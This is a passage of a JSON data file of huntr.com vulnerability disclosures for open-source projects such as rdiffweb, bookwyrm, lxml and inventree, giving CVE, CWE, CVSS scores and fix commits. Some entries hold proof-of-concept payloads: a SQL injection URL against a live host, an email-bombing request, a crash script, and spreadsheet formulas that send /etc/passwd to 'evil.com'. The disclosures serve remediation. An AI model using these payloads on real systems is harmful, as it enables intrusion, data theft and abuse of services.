"Medium (4.3)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/2406780831618405a13113377a784f3102465f40", "description": "Description\nDue to improper cache control an attacker can view sensitive information even if he is not logged into the account\nProof of Concept\nGo to https://rdiffweb-demo.ikus-soft.com/login/ and login into your account using given credentials\nGo to https://rdiffweb-demo.ikus-soft.com/admin/logs and this endpoint has the entire log\nClick on Logout\nNow press the back button of your browser\nYou will notice that you are still able to view the sensitive data/log files\nMitigation: Cache-Control: private, no-cache, no-store, max-age=0 Pragma: no-cache Expires: 0\nImpact\nAn attacker can get access to sensitive information due to improper cache control"}, "https://huntr.com/bounties/d3bf1e5d-055a-44b8-8d60-54ab966ed63a/": {"cve": "CVE-2022-3301", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3301", "cwe": "CWE-460: Improper Cleanup on Thrown Exception", "cwe_link": "https://cwe.mitre.org/data/definitions/460.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/5ac38b2a75becbab9f948bd5e37ecbcd9f0b362e", "description": "Description\nThis attack involves injecting malicious data into a page of a web application to feed misleading information to users of the application. This kind of attack is known as virtual defacement because the actual content hosted on the target's web server is not modified. The defacement is generated solely because of how the application processes and renders user-supplied input.\nProof of Concept\nGo to https://rdiffweb-demo.ikus-soft.com\nLogin using the credentials - admin , admin123\nVisit url : https://rdiffweb-demo.ikus-soft.com/This website has been hacked and the confidential data of all users have been compromised and leaked to public . You can craft your personal message here .\nYour message \"This website has been hacked and the confidential data of all users have been compromised and leaked to public\" will be displayed\nAttack Scenario: Attacker constructs a malicious message.Attackers start posting this URL everywhere on social media. The message might get the attention of the media and several people might believe the news to be true which will cause huge business reputation and monetary damage\nImpact\nA professionally crafted defacement, delivered to the right recipients in a convincing manner, could be picked up by the news media and have real-world effects on people's behavior, stock prices, and so on, to the attacker's financial benefit."}, "https://huntr.com/bounties/67c25969-5e7a-4424-817e-e1a918f63cc6/": {"cve": "CVE-2022-3269", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3269", "cwe": "CWE-384: Session Fixation", "cwe_link": "https://cwe.mitre.org/data/definitions/384.html", "severity_score": "Medium (6.4)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/39e7dcd4a1f44d2a7bd92b79d78a800910b1b22b", "description": "Description\nAfter logging in and logging out, the application continues to use the preauthentication cookies. The cookies are same after closing the browser and after password change .And also same cookies are reassigning for another user's login which can leads to session fixation.\nProof of Concept\nChecklist\n[ ] Check cookie before authentication\n[ ] Check cookie after guest user authentication\n[ ] Check cookie after admin user authentication\n[ ] Check cookie after logout\n[ ] Check cookie after closing the browser\nPOC : https://drive.google.com/file/d/1nur3xAzgPJB4mgEAyQANVr4f2sOm4HmW/view?usp=sharing\nImpact\nAn attacker can gain unauthorized access to the account of users who are using the same browser as long as a single session cookie persists on that browser once the attacker obtains a session cookie through another attack."}, "https://huntr.com/bounties/c40badc3-c9e7-4b69-9e2e-2b9f05865159/": {"cve": "CVE-2022-3175", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3175", "cwe": "CWE-756: Missing Custom Error Page", "cwe_link": "https://cwe.mitre.org/data/definitions/756.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/233befc33bdc45d4838c773d5aed4408720504c5", "description": "Description\nInformation is leak in error page and this can support for other vulnerabilities.\nProof of Concept\nWhenever trying to input anything meaningless after the link https://rdiffweb-demo.ikus-soft.com/ the error page will appear. Example: https://rdiffweb-demo.ikus-soft.com/* https://rdiffweb-demo.ikus-soft.com/' https://rdiffweb-demo.ikus-soft.com/admin/\nImpact\nLeaking information. Chance for other vulnerabilities."}, "https://huntr.com/bounties/b7d49659-0233-4af4-81a2-4a3f98433f23/": {"cve": "", "cve_link": "", "cwe": "CWE-287: Improper Authentication", "cwe_link": "https://cwe.mitre.org/data/definitions/287.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/7bbe42fb30a79a26115524d18b697d895563c92f", "description": "Description\nI have identified that when Reset Password for account , the request has no rate limit which then can be used to loop through one request. This can annoy to the root users sending mass password to one email.\nA rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache. In case a client made too many requests within a given timeframe, HTTP-Servers can respond with status code 429: Too Many Requests.\nSteps To Reproduce\nStep 1-Go To This Link https://book.dansmonorage.blue/password-reset, Enter Email and Click On Reset Password.\n  Step 2- Intercept This Request In Burp\nPOST /password-reset HTTP/2\nHost: book.dansmonorage.blue\nCookie: django_language=None; csrftoken=1gH9ijzrFTrOdzqmg2qMmO47kk7rOrLdKh598InB4FyFJYIuxNFjTMAlAOwjqGVy\nContent-Length: 107\nCache-Control: max-age=0\nSec-Ch-Ua: \"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://book.dansmonorage.blue\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://book.dansmonorage.blue/password-reset\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\n\ncsrfmiddlewaretoken=8DZD8s4ZORRMR29XjdZmG2CojotfdfVEREnDYRS9dDYDnrr5AYeTd08CzSS7Pu5Z&email=<email_address>\nStep 3- Now Send This Request To Intruder And Repeat It 100 Time By Fixing Any Arbitrary Payload Which Doesn't No Effect Request. For Example, I Choose Accept-Language: en-GB,en-US;q=0.9,en;q=0.\u00a78\u00a7.\n  Step 4 - See that You Will Get 200 OK Status Code & a lot of reset password email In Your INBOX.\nIt Is Resulting In Mass Mailing Or Email Bombing To Your Users Which Is Bad For Business Impact\nImpact\nIf You Are Using Any Email Service Software API Or Some Tool Which Costs You For Your Email This Type Of Attack Can Result You In Financial Lose And It Can Also Slow Down Your Services It Can Take Bulk Of Storage In Sent Mail Although If Users Are Affected By This Vulnerability They Can Stop Using Your Services Which Can Lead To Business Risk.\nSolution\nI Will Recommend You To Add A ReCaptcha & Sort Of Something Which Requires Manual Human Interaction To Proceed Like You Can Add Captcha Like 2+2=___ so that it cannot be brute forced and you also can have a limit at the backend for particular number upto 5 times a day user can request Forget Password Email or Link something like that will prevent you from someone exploiting this vulnerability"}, "https://huntr.com/bounties/ebee593d-3fd0-4985-bf5e-7e7927e08bf6/": {"cve": "CVE-2022-35925", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-35925", "cwe": "CWE-304: Missing Critical Step in Authentication", "cwe_link": "https://cwe.mitre.org/data/definitions/304.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/7bbe42fb30a79a26115524d18b697d895563c92f", "description": "Hello team, while i was testing on https://book.dansmonorage.blue/login i noticed that there is no ratelimit protection on POST login form, so an attacker can takeover the account by brute forcing the password field\nSteps to reproduce:\ngo to https://book.dansmonorage.blue/login\nEnter username and any password\nCapture the request with burpsuite and start bruteforcing with our wordlist\nPOC Screenshot:\nPatch recommendation:\nAdd ratelimit protecion on POST login endpoints/parameters\nImpact\nAccount takeover"}, "https://huntr.com/bounties/8264e74f-edda-4c40-9956-49de635105ba/": {"cve": "CVE-2022-2309", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2309", "cwe": "CWE-476: NULL Pointer Dereference", "cwe_link": "https://cwe.mitre.org/data/definitions/476.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/lxml/lxml", "fix_commit": "https://www.github.com/lxml/lxml/commit/86368e9cf70a0ad23cccd5ee32de847149af0c6f", "description": "Description\nNULL Pointer Dereference in function vim_appendStartNsEvents at src/lxml/iterparse.pxi:435 allows attackers to cause a denial of service (or application crash).\nProof of Concept\nfrom io import StringIO\n\nfrom lxml import etree\n\n\nfirst_input = \"\"\"\n<anot xmlns=\"1\">\n\"\"\"\n\nsecond_input = \"\"\"\n<root>\n</root>\n\"\"\"\n\n\ndef parse_and_canonicalize(raw):\n    input = StringIO(raw)\n    try:\n        et = etree.parse(input)\n        etree.canonicalize(et)\n    except etree.XMLSyntaxError as e:\n        print(e)\n\n\ndef reproduce():\n    print('parse_and_canonicalize first_input:')\n    parse_and_canonicalize(first_input)\n    print('parse_and_canonicalize second_input:')\n    parse_and_canonicalize(second_input)\n\n\nreproduce()\n# python3 /opt/issue1_simplified.py\nparse_and_canonicalize first_input:\nPremature end of data in tag anot line 2, line 3, column 1 (<string>, line 3)\nparse_and_canonicalize second_input:\nSegmentation fault\nASAN\n# python3 /opt/issue1_simplified.py\nparse_and_canonicalize first_input:\nEndTag: '</' not found, line 3, column 1 (<string>, line 3)\nparse_and_canonicalize second_input:\nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==1807==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fe52028eb71 bp 0x7ffe7eb91930 sp 0x7ffe7eb910d8 T0)\n==1807==The signal is caused by a READ memory access.\n==1807==Hint: address points to the zero page.\n    #0 0x7fe52028eb71  (/lib/x86_64-linux-gnu/libc.so.6+0x15fb71) (BuildId: 2e5abcee94f3bcbed7bba094f341070a2585a2ba)\n    #1 0x7fe52076055c in __interceptor_strlen.part.0 /root/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:457:31\n    #2 0x7fe51dfc74fc in __pyx_f_4lxml_5etree_funicode /go/src/github.com/lxml/lxml/src/lxml/etree.c:35453:69\n    #3 0x7fe51dfccf81 in __pyx_f_4lxml_5etree__appendStartNsEvents /go/src/github.com/lxml/lxml/src/lxml/etree.c:174724:17\n    #4 0x7fe51dfccf81 in __pyx_f_4lxml_5etree_8iterwalk__start_node /go/src/github.com/lxml/lxml/src/lxml/etree.c:174099:17\n    #5 0x7fe51e090543 in __pyx_pf_4lxml_5etree_8iterwalk___init__ /go/src/github.com/lxml/lxml/src/lxml/etree.c:172874:17\n    #6 0x7fe51e090543 in __pyx_pw_4lxml_5etree_8iterwalk_1__init__ /go/src/github.com/lxml/lxml/src/lxml/etree.c:172428:13\n    #7 0x7fe52046560a in type_call /usr/src/python/Objects/typeobject.c:1028:19\n    #8 0x7fe51e05221c in __Pyx_PyObject_Call /go/src/github.com/lxml/lxml/src/lxml/etree.c:262313:15\n    #9 0x7fe51e05221c in __pyx_f_4lxml_5etree__tree_to_target /go/src/github.com/lxml/lxml/src/lxml/etree.c:152365:15\n    #10 0x7fe51e0d5f0b in __pyx_pf_4lxml_5etree_53canonicalize /go/src/github.com/lxml/lxml/src/lxml/etree.c:152014:17\n    #11 0x7fe51e0d5f0b in __pyx_pw_4lxml_5etree_54canonicalize /go/src/github.com/lxml/lxml/src/lxml/etree.c:151832:13\n    #12 0x7fe520434b8b in _PyObject_MakeTpCall /usr/src/python/Objects/call.c:191:18\n    #13 0x7fe520490a63 in _PyObject_VectorcallTstate /usr/src/python/./Include/cpython/abstract.h:116:16\n    #14 0x7fe520490a63 in _PyObject_VectorcallTstate /usr/src/python/./Include/cpython/abstract.h:103:1\n    #15 0x7fe520490a63 in PyObject_Vectorcall /usr/src/python/./Include/cpython/abstract.h:127:12\n    #16 0x7fe520490a63 in call_function /usr/src/python/Python/ceval.c:5077:13\n    #17 0x7fe520490a63 in _PyEval_EvalFrameDefault /usr/src/python/Python/ceval.c:3489:23\n    #18 0x7fe520435502 in _PyEval_EvalFrame /usr/src/python/./Include/internal/pycore_ceval.h:40:12\n    #19 0x7fe520435502 in function_code_fastcall /usr/src/python/Objects/call.c:330:24\n    #20 0x7fe52048c07e in _PyObject_VectorcallTstate /usr/src/python/./Include/cpython/abstract.h:118:11\n    #21 0x7fe52048c07e in PyObject_Vectorcall /usr/src/python/./Include/cpython/abstract.h:127:12\n    #22 0x7fe52048c07e in call_function /usr/src/python/Python/ceval.c:5077:13\n    #23 0x7fe52048c07e in _PyEval_EvalFrameDefault /usr/src/python/Python/ceval.c:3520:19\n    #24 0x7fe52048b17f in _PyEval_EvalFrame /usr/src/python/./Include/internal/pycore_ceval.h:40:12\n    #25 0x7fe52048b17f in _PyEval_EvalCode /usr/src/python/Python/ceval.c:4329:14\n    #26 0x7fe52048aeb0 in _PyEval_EvalCodeWithName /usr/src/python/Python/ceval.c:4361:12\n    #27 0x7fe52048ae52 in PyEval_EvalCodeEx /usr/src/python/Python/ceval.c:4377:12\n    #28 0x7fe5204ff63a in PyEval_EvalCode /usr/src/python/Python/ceval.c:828:12\n    #29 0x7fe520510ccc in run_eval_code_obj /usr/src/python/Python/pythonrun.c:1221:9\n    #30 0x7fe520510c5a in run_mod /usr/src/python/Python/pythonrun.c:1242:19\n    #31 0x7fe5203dbcac in pyrun_file /usr/src/python/Python/pythonrun.c:1140:15\n    #32 0x7fe5203dba4d in pyrun_simple_file /usr/src/python/Python/pythonrun.c:450:13\n    #33 0x7fe5203dba4d in PyRun_SimpleFileExFlags /usr/src/python/Python/pythonrun.c:483:15\n    #34 0x7fe52051869f in pymain_run_file /usr/src/python/Modules/main.c:373:15\n    #35 0x7fe52051869f in pymain_run_python /usr/src/python/Modules/main.c:598:21\n    #36 0x7fe52051869f in Py_RunMain /usr/src/python/Modules/main.c:677:5\n    #37 0x7fe520518228 in Py_BytesMain /usr/src/python/Modules/main.c:731:12\n    #38 0x7fe520155d09 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x26d09) (BuildId: 2e5abcee94f3bcbed7bba094f341070a2585a2ba)\n    #39 0x55ef444f9089 in _start (/usr/local/bin/python3.9+0x1089) (BuildId: 1148851faf1976a4d22434ab21e2d7213fe86617)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0x15fb71) (BuildId: 2e5abcee94f3bcbed7bba094f341070a2585a2ba)\n==1807==ABORTING\nImpact\nNULL Pointer Dereference allows attackers to cause a denial of service (or application crash)."}, "https://huntr.com/bounties/46dc36b7-0648-4104-923c-99889bbb7b23/": {"cve": "", "cve_link": "", "cwe": "CWE-440: Expected Behavior Violation", "cwe_link": "https://cwe.mitre.org/data/definitions/440.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/f9aa5a60fdfe9de9869b8f50c6fa9d739ad2ae05", "description": "Description\nThe application does not require a valid MFA authenticator token, user credentials, or other mechanism to disable MFA on an account.\nProof of Concept\n1. In an account with MFA enabled, go to User Settings\n2. Click on Remove multifactor\n3. Select the response when the window pops up\n4. Skip entering information into the Setup Two-Factor Authentication screen\n5. Return to the Account Settings and note that the authentication type is no longer present\n6. Logout\n7. Login without MFA required\nNote that this occurs when the user has enabled MFA, not an administrative action in the application.\nImpact\nMFA protections are in place to ensure that an attacker cannot access an authenticated portal without a second factor. If an attack can compromise a victim account through hardware or social engineering compromise, the attacker can simply click Remove multifactor. The issue can be compounded with the application's current poor password policy that does not require a current password validation in order to change account credentials."}, "https://huntr.com/bounties/e57c36e7-fa39-435f-944a-3a52ee066f73/": {"cve": "CVE-2022-2112", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2112", "cwe": "CWE-1236: Improper Neutralization of Formula Elements in a CSV File", "cwe_link": "https://cwe.mitre.org/data/definitions/1236.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nFormula Injection/CSV Injection in inventree due to Improper Neutralization of Formula Elements in CSV File.\nProof of Concept\nVideo PoC link: https://drive.google.com/file/d/1mf_BTUDS1iZ4uJfBpc56_8WgpdZdN5_f/view?usp=sharing\nImpact\nSuccessful exploitation can lead to impacts such as client-sided command injection, code execution, or remote ex-filtration of contained confidential data. On constructing the payloads as\n=HYPERLINK(CONCATENATE(\"http://attackerserver:port/a.txt?v=\"; ('file:///etc/passwd'#$passwd.A1));\n=HYPERLINK(\"http://evil.com?x=\"&A3&\",\"&B3&\"[CR]\",\"Error fetching info: Click me to resolve.\")\nAn attacker can have access to /etc/passwd system file"}, "https://huntr.com/bounties/fc4eb544-ef1e-412d-9fdb-0ceb04e038fe/": {"cve": "CVE-2022-1531", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1531", "cwe": "CWE-89: SQL Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/89.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rtxteam/rtx", "fix_commit": "https://www.github.com/rtxteam/rtx/commit/fa2797e656e3dba18f990a2db1f0f029d41f1921", "description": "Description\nThe /rtxcomplete/nodeslike endpoint in the ARAX-UI application at https://arax.rtx.ai is vulnerable to SQL injection. It is possible to include a malicious SQL payload in the word query parameter for this endpoint that would allow an attacker to dump the database, make modifications to data, or delete data. In addition it is possible to completely takeover the server where the application is hosted, by performing remote code execution via this vulnerability.\nProof of Concept\nPerform a GET request to:\nhttps://arax.rtx.ai/rtxcomplete/nodeslike?word=test\\\" UNION SELECT sqlite_version()---&limit=15&callback=jQuery33105838363973705006_1650064361901&_=1650064362018\nThe server will return JSON in the HTTP response, with the SQLite version as \"3.11.0\" as part of the first item in the array:\njQuery33105838363973705006_1650064361901([{\"curie\": \"??\", \"name\": \"3.11.0\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testa-C\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"testacea group\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacella\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacella haliotidea\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacella maugei\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacella scutulum\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacella sp. NMW.Z\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testacellidae\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"testase 4, human\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testate\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testechiniscus\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Testechiniscus spitsbergensis\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"tested for\", \"type\": \"??\"}, {\"curie\": \"??\", \"name\": \"Tested for HIV\", \"type\": \"??\"}]);\nImpact\nThis vulnerability is critical as it can lead to remote code execution and thus complete server takeover."}, "https://huntr.com/bounties/01f878c5-af66-469f-9d05-da7f24ddeb1a/": {"cve": "CVE-2022-24761", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-24761", "cwe": "CWE-444: HTTP Request Smuggling", "cwe_link": "https://cwe.mitre.org/data/definitions/444.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pylons/waitress", "fix_commit": "https://www.github.com/pylons/waitress/commit/9e0b8c801e4d505c2ffc91b891af4ba48af715e0", "description": "Summary\nDue to several violations of the HTTP standard as defined in RFC7230, Waitress is vulnerable to HTTP request smuggling when used with an upstream proxy that exhibits nonstandard behaviour.\nEach issue is explained in the Occurrences section below."}, "https://huntr.com/bounties/d5e88936-6027-4d92-a48f-0fabcaea906a/": {"cve": "", "cve_link": "", "cwe": "CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer", "cwe_link": "https://cwe.mitre.org/data/definitions/212.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/6512ab7542c96364f593b9be221cdc74ecfa6a0d", "description": "Description\nThe application leaked emails of unvalidated users to anonymous user.\nProof of Concept\nStep 1: Go to http://127.0.0.1:8000/register and create account. After create success, you will receive URL like http://127.0.0.1:8000/account/result.html?type=register&id=4\nStep 2: Open another browser and paste link, you will see email of unvalidated user with id=4\nImpact\nRevealing users' personal information. The application should only show the message immediately after successful registration, not all the time."}, "https://huntr.com/bounties/73ebb08a-0415-41be-b9b0-0cea067f6771/": {"cve": "", "cve_link": "", "cwe": "CWE-76: Improper Neutralization of Equivalent Special Elements", "cwe_link": "https://cwe.mitre.org/data/definitions/76.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/delgan/loguru", "fix_commit": "https://www.github.com/delgan/loguru/commit/bc1dab4cc5044d704a980f5675b9d02f9f61b528", "description": "Description\nLoguru is vulnerable to log injection on all logging methods as it is possible to inject newlines (\"\\n\") which will create a new log entry in the logfile. This can lead to attackers tampering with logs and a loss of integrity of the log files as a result\nProof of Concept\nfrom loguru import logger\n\nusername = \"Josh just logged in\\n2022-01-24 22:39:30.976 | INFO     | __main__:<module>:5 - User James\"\nlogger.add(\"inject.log\")\nlogger.info(\"User \" + username + \" just logged in.\")\nResult:\n2022-01-24 22:39:26.190 | INFO     | __main__:<module>:5 - User Josh just logged in\n2022-01-24 22:39:30.976 | INFO     | __main__:<module>:5 - User James just logged in.\nImpact\nUsers can inject logs into loguru via newlines. This affects logger.trace, logger.debug, logger.info, logger.success, logger.warning, logger.error, logger.critical, logger.exception, logger.log functions (9 functions in total).\nRecommended Fix\nEscape special characters (such as \\n and \\r) by default. As a comparison, other logging frameworks such as PHP's Monolog do this by default."}, "https://huntr.com/bounties/b806b9c3-48c8-44cd-bbce-918dd6d1e2ad/": {"cve": "", "cve_link": "", "cwe": "CWE-447: Unimplemented or Unsupported Feature in UI", "cwe_link": "https://cwe.mitre.org/data/definitions/447.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/spiral-project/ihatemoney", "fix_commit": "https://www.github.com/spiral-project/ihatemoney/commit/e626a1cbea766ce15d528e7379208435aa5cad4f", "description": "\ud83d\udca5 BUG\nclickjacking bug.\n\ud83d\udca5 STEP TO REPRODUCE\nI see there is no X-Frame-Options header present in response . So, it allow to load dashboard url in iframe which make clickjacking attack . Iframe will be completely hidden with opacity control so that victim dont suspect .\nbellow code can be used as attack\n<iframe src=\"https://ihatemoney.org/xxxx/\" height=\"600px\" width=\"800px\" style=\"opacity:0.4\">\n\ud83d\udca5 Impact\nhttps://www.imperva.com/learn/application-security/clickjacking/\nhttps://portswigger.net/web-security/clickjacking\nhttps://owasp.org/www-community/attacks/Clickjacking\nAs this iframe is completely hidden , victim can suspect what happening in background and make clickjacking attack"}}